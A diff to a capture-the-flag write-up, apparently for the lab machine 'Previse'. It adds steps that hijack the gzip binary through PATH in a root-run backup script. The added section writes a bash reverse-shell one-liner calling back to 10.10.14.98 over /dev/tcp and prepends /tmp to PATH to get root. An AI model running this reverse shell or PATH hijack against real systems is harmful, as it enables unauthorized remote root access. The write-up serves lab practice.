@@ -22,6 +22,19 @@ gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%
 ```
 ## Inspecting contents of `access_backup.sh` 
 Inspecting contents of `access_backup.sh` . gzip command can be path hijacked to gain root.
-## stroring bash reverse shell in file named 'gzip' in /tmp directory and adding /tmp directory to 'PATH'
+## Stroring bash reverse shell in file named 'gzip' in /tmp directory and adding /tmp directory to 'PATH' to path hijack gzip binary
+Stroring bash reverse shell in file named 'gzip' in /tmp directory and adding /tmp directory to 'PATH' as shown below to path hijack gzip binary.
+```bash
+m4lwhere@previse:/tmp$ nano gzip
+m4lwhere@previse:/tmp$ cat gzip
+0<&196;exec 196<>/dev/tcp/10.10.14.98/1234; bash <&196 >&196 2>&196
+m4lwhere@previse:/tmp$ chmod +x gzip
+m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
+m4lwhere@previse:/tmp$ echo $PATH
+/tmp:/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/tmp
+```
+## Getting reverse shell as root running `/opt/scripts/access_backup.sh` as root.
+![[Pasted image 20210918124900.png]]
+
 
 
